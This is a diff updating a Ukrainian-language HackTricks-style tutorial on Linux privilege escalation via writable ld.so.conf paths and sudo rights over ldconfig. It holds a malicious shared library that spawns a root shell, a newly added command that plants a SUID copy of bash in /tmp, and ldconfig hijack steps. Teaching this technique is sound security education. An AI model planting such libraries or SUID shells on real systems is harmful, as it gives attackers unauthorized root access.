@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Підготовка середовища
+## Підготуйте середовище
 
-У наступному розділі ви знайдете код файлів, які ми будемо використовувати для підготовки середовища
+У наступному розділі ви можете знайти код файлів, які ми будемо використовувати для підготовки середовища
 
 {{#tabs}}
 {{#tab name="sharedvuln.c"}}
@@ -40,14 +40,14 @@ puts("Hi");
 {{#endtab}}
 {{#endtabs}}
 
-1. **Створіть** ці файли на вашій машині в тій же папці
-2. **Скомпілюйте** **бібліотеку**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Скопіюйте** `libcustom.so` до `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root привілеї)
-4. **Скомпілюйте** **виконуваний файл**: `gcc sharedvuln.c -o sharedvuln -lcustom`
+1. **Створіть** ці файли на своїй машині в тій самій папці
+2. **Скомпілюйте** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. **Скопіюйте** `libcustom.so` до `/usr/lib` і оновіть cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
+4. **Скомпілюйте** **executive**: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
-### Перевірте середовище
+### Перевірте environment
 
-Перевірте, що _libcustom.so_ завантажується з _/usr/lib_ і що ви можете **виконати** двійковий файл.
+Переконайтеся, що _libcustom.so_ **завантажується** з _/usr/lib_ і що ви можете **виконати** binary.
 ```
 $ ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
@@ -59,31 +59,61 @@ $ ./sharedvuln
 Welcome to my amazing application!
 Hi
 ```
+### Корисні triage команди
+
+Під час атаки на реальну ціль перевірте **точну назву бібліотеки**, яка потрібна binary, і що loader **зараз резолвить**:
+```bash
+readelf -d ./sharedvuln | grep NEEDED
+ldconfig -p | grep libcustom
+/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
+# x86_64; adjust for your arch
+LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
+```
+Кілька корисних нюансів:
+
+- `sudo echo ... > /etc/ld.so.conf.d/x.conf` зазвичай **не працює**, тому що
+  перенаправлення виконує ваш поточний shell. Натомість використовуйте
+  `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
+- **SUID/privileged** binaries ігнорують `LD_LIBRARY_PATH`/`LD_PRELOAD` у
+  **secure-execution mode**, але директорії з `/etc/ld.so.conf` усе ще є
+  частиною довіреної конфігурації loader, тож ця misconfiguration все ще може
+  впливати на privileged programs.
+- У новіших версіях glibc dynamic loader також надає
+  `--list-diagnostics`, що зручно для debug cache resolution і вибору
+  піддиректорії `glibc-hwcaps`, коли hijack поводиться не так, як очікується.
+
 ## Exploit
 
-У цьому сценарії ми будемо припускати, що **хтось створив вразливий запис** у файлі _/etc/ld.so.conf/_:
+У цьому сценарії припустімо, що **хтось створив вразливий запис** у файлі в _/etc/ld.so.conf/_:
 ```bash
-sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
+echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
 ```
-Вразлива папка - _/home/ubuntu/lib_ (де у нас є можливість запису).\
-**Завантажте та скомпілюйте** наступний код у цій папці:
+Вразлива папка — _/home/ubuntu/lib_ (де ми маємо доступ на запис).\
+**Завантажте та скомпілюйте** наведений нижче код у цьому шляху:
 ```c
-//gcc -shared -o libcustom.so -fPIC libcustom.c
+// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c
 
 #include <stdio.h>
+#include <stdlib.h>
 #include <unistd.h>
 #include <sys/types.h>
 
-void vuln_func(){
+void vuln_func(void){
 setuid(0);
 setgid(0);
-printf("I'm the bad library\n");
-system("/bin/sh",NULL,NULL);
+puts("I'm the bad library");
+system("/bin/sh");
 }
 ```
-Тепер, коли ми **створили шкідливу бібліотеку libcustom всередині неправильно налаштованого** шляху, нам потрібно почекати **перезавантаження** або щоб користувач root виконав **`ldconfig`** (_якщо ви можете виконати цей бінар як **sudo** або у нього є **suid біт**, ви зможете виконати його самостійно_).
+Якщо ви очікуєте, що **root** (або інший привілейований обліковий запис) пізніше виконає вразливий binary, зазвичай краще залишити **root-owned artifact** замість запуску інтерактивного shell. Наприклад:
+```c
+system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
+```
+Тоді, після того як відбудеться привілейоване виконання, ви можете використати `/tmp/rootbash -p`.
 
-Після цього **перевірте знову**, звідки виконується `sharevuln`, завантажуючи бібліотеку `libcustom.so`:
+Тепер, коли ми **створили шкідливу бібліотеку libcustom всередині неправильно налаштованого** шляху, нам потрібно дочекатися **reboot** або щоб користувач root виконав **`ldconfig`** (_якщо ви можете виконати цей binary через **sudo** або він має **suid bit**, ви зможете виконати його самостійно_).
+
+Після того як це станеться, **перевірте ще раз**, звідки виконавчий файл `sharedvuln` завантажує бібліотеку `libcustom.so`:
 ```c
 $ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffeee766000)
@@ -91,7 +121,7 @@ libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
 /lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-Як ви можете бачити, він **завантажується з `/home/ubuntu/lib`** і якщо будь-який користувач його виконає, буде виконано оболонку:
+Як ви можете бачити, це **завантажується з `/home/ubuntu/lib`**, і якщо будь-який користувач виконає це, буде запущено shell:
 ```c
 $ ./sharedvuln
 Welcome to my amazing application!
@@ -99,28 +129,29 @@ I'm the bad library
 $ whoami
 ubuntu
 ```
-> [!NOTE]
-> Зверніть увагу, що в цьому прикладі ми не підвищили привілеї, але модифікуючи виконувані команди та **чекаючи, поки root або інший привілейований користувач виконає вразливий бінарний файл**, ми зможемо підвищити привілеї.
+> [!TIP]
+> Зверніть увагу, що в цьому прикладі ми не підвищили privileges, але, модифікуючи команди, що виконуються, і **чекаючи, поки root або інший privileged user запустить вразливий binary**, ми зможемо підвищити privileges.
 
-### Інші неправильні налаштування - Така ж вразливість
+### Other misconfigurations - Same vuln
 
-У попередньому прикладі ми створили ілюзію неправильного налаштування, де адміністратор **встановив непривабливу папку в конфігураційному файлі в `/etc/ld.so.conf.d/`**.\
-Але є й інші неправильні налаштування, які можуть викликати таку ж вразливість, якщо у вас є **права на запис** у деякому **конфігураційному файлі** в `/etc/ld.so.conf.d`, у папці `/etc/ld.so.conf.d` або в файлі `/etc/ld.so.conf`, ви можете налаштувати таку ж вразливість і експлуатувати її.
+У попередньому прикладі ми підробили misconfiguration, де administrator **встановив непривілейовану теку всередині configuration file у `/etc/ld.so.conf.d/`**.\
+Але є й інші misconfiguration, які можуть спричинити ту саму vulnerability: якщо у вас є **write permissions** у якомусь **config file** всередині `/etc/ld.so.conf.d`s, у теці `/etc/ld.so.conf.d` або у файлі `/etc/ld.so.conf`, ви можете налаштувати ту саму vulnerability і exploit it.
 
-## Експлуатація 2
+## Exploit 2
 
-**Припустимо, у вас є привілеї sudo над `ldconfig`**.\
-Ви можете вказати `ldconfig`, **звідки завантажувати конфігураційні файли**, тому ми можемо скористатися цим, щоб змусити `ldconfig` завантажувати довільні папки.\
-Отже, давайте створимо файли та папки, необхідні для завантаження "/tmp":
+**Припустімо, у вас є sudo privileges над `ldconfig`**.\
+Ви можете вказати `ldconfig` **звідки завантажувати conf files**, тож ми можемо скористатися цим, щоб змусити `ldconfig` завантажити arbitrary folders.\
+Тож давайте створимо files і folders, потрібні для завантаження "/tmp":
 ```bash
 cd /tmp
+mkdir -p conf
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-Тепер, як вказано в **попередньому експлойті**, **створіть шкідливу бібліотеку в `/tmp`**.\
-І нарешті, давайте завантажимо шлях і перевіримо, звідки бінарний файл завантажує бібліотеку:
+Тепер, як зазначено в **previous exploit**, **створіть шкідливу бібліотеку всередині `/tmp`**.\
+І нарешті, давайте завантажимо шлях і перевіримо, звідки binary завантажує бібліотеку:
 ```bash
-ldconfig -f fake.ld.so.conf
+sudo ldconfig -f fake.ld.so.conf
 
 ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007fffa2dde000)
@@ -128,6 +159,12 @@ libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-**Як ви можете бачити, маючи привілеї sudo над `ldconfig`, ви можете експлуатувати ту ж уразливість.**
+**Як ви можете бачити, маючи sudo privileges над `ldconfig`, ви можете експлуатувати ту саму vulnerability.**
 
+
+
+## References
+
+- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
+- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
 {{#include ../../banners/hacktricks-training.md}}
